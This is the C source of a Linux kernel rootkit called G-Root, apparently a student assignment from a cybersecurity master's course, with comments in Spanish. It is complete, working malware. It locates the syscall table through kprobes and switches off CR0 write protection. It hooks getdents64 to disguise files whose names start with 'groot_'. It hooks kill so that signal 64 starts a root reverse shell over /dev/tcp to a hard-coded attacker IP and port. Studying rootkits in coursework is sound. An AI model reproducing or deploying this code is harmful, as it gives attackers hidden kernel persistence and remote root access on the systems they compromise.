/*
 * G-Root: Rootkit de kernel Linux para fines educativos
 * Tarea 3 - Principios de Seguridad en Sistemas Operativos
 * Maestría en Ciberseguridad - TEC
 *
 * Arquitectura: x86_64 / kernel 5.7+ (probado en 6.8)
 * Técnica: syscall table hooking via kprobes + stop_machine
 *
 * Modificación: archivos con prefijo "groot_" aparecen como "Oculto"
 * Extra: kernel > 5.0 + reverse shell via kill -64
 *
 * Autores: Sebastián Quesada Chaverri (2019065076)
 *          [Compañero 2], [Compañero 3]
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/stop_machine.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastián Quesada, TEC Maestría Ciberseguridad");
MODULE_DESCRIPTION("G-Root: Rootkit educativo x86_64");
MODULE_VERSION("1.0");

#define PREFIX        "groot_"
#define HIDDEN_NAME   "Oculto"
#define ATTACKER_IP   "192.168.1.100"
#define ATTACKER_PORT "4444"
#define SHELL_SIGNAL   64

/* ============================================================
 * RESOLUCIÓN DE SÍMBOLOS VIA KPROBES (kernel >= 5.7)
 * ============================================================ */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t g_kallsyms_lookup_name = NULL;
static unsigned long *g_sct = NULL;  /* syscall table */

static int resolve_symbols(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("g-root: register_kprobe falló: %d\n", ret);
        return ret;
    }
    g_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    g_sct = (unsigned long *)
        g_kallsyms_lookup_name("sys_call_table");
    if (!g_sct) {
        pr_err("g-root: sys_call_table no encontrada\n");
        return -ENOENT;
    }
    pr_info("g-root: sys_call_table = %px\n", g_sct);
    return 0;
}

/* ============================================================
 * ESCRITURA EN SYSCALL TABLE — x86_64
 * Desactivamos write-protect via CR0
 * ============================================================ */
typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*sys_kill_t)(const struct pt_regs *);

static sys_getdents64_t orig_getdents64 = NULL;
static sys_kill_t       orig_kill       = NULL;

static inline void cr0_write_enable(void)
{
    unsigned long cr0 = read_cr0();
    cr0 &= ~X86_CR0_WP;
    write_cr0(cr0);
}

static inline void cr0_write_disable(void)
{
    unsigned long cr0 = read_cr0();
    cr0 |= X86_CR0_WP;
    write_cr0(cr0);
}

struct patch {
    int           index;
    unsigned long new_fn;
    unsigned long *saved;
};

static int apply_patch(void *arg)
{
    struct patch *p = (struct patch *)arg;
    cr0_write_enable();
    if (p->saved)
        *p->saved = g_sct[p->index];
    g_sct[p->index] = p->new_fn;
    cr0_write_disable();
    return 0;
}

static void install_hook(int nr, unsigned long fn, unsigned long *orig)
{
    struct patch p = { .index = nr, .new_fn = fn, .saved = orig };
    stop_machine(apply_patch, &p, NULL);
}

static void remove_hook(int nr, unsigned long orig_fn)
{
    struct patch p = { .index = nr, .new_fn = orig_fn, .saved = NULL };
    stop_machine(apply_patch, &p, NULL);
}

/* ============================================================
 * HOOK: getdents64
 * Renombra archivos con prefijo PREFIX a HIDDEN_NAME
 * ============================================================ */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *) regs->si;
    long ret;
    struct linux_dirent64 *ker_buf, *cur;
    unsigned long offset = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    ker_buf = kzalloc(ret, GFP_KERNEL);
    if (!ker_buf)
        return ret;

    if (copy_from_user(ker_buf, dirent, ret)) {
        kfree(ker_buf);
        return ret;
    }

    while (offset < ret) {
        cur = (void *)ker_buf + offset;
        if (cur->d_reclen == 0)
            break;

        if (strncmp(cur->d_name, PREFIX, strlen(PREFIX)) == 0) {
            pr_info("g-root: '%s' -> '%s'\n", cur->d_name, HIDDEN_NAME);
            memset(cur->d_name, 0, strlen(cur->d_name));
            strncpy(cur->d_name, HIDDEN_NAME, NAME_MAX);
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(dirent, ker_buf, ret))
        pr_warn("g-root: copy_to_user falló\n");

    kfree(ker_buf);
    return ret;
}

/* ============================================================
 * HOOK: kill — reverse shell con señal 64
 * ============================================================ */
static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = (int) regs->si;

    if (sig == SHELL_SIGNAL) {
        static char cmd[128];
        char *argv[] = { "/bin/bash", "-c", cmd, NULL };
        char *envp[] = {
            "HOME=/root",
            "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
            NULL
        };
        snprintf(cmd, sizeof(cmd),
                 "bash -i >& /dev/tcp/%s/%s 0>&1",
                 ATTACKER_IP, ATTACKER_PORT);
        pr_info("g-root: señal %d -> reverse shell\n", sig);
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        return 0;
    }

    return orig_kill(regs);
}

/* ============================================================
 * INIT / EXIT
 * ============================================================ */
static int __init rootkit_init(void)
{
    int ret = resolve_symbols();
    if (ret) return ret;

    install_hook(__NR_getdents64,
                 (unsigned long)hook_getdents64,
                 (unsigned long *)&orig_getdents64);

    install_hook(__NR_kill,
                 (unsigned long)hook_kill,
                 (unsigned long *)&orig_kill);

    pr_info("g-root: hooks instalados\n");
    pr_info("g-root: prefijo '%s' -> '%s'\n", PREFIX, HIDDEN_NAME);
    pr_info("g-root: kill -%d <pid> activa reverse shell\n", SHELL_SIGNAL);
    return 0;
}

static void __exit rootkit_exit(void)
{
    remove_hook(__NR_getdents64, (unsigned long)orig_getdents64);
    remove_hook(__NR_kill,       (unsigned long)orig_kill);
    pr_info("g-root: modulo descargado\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
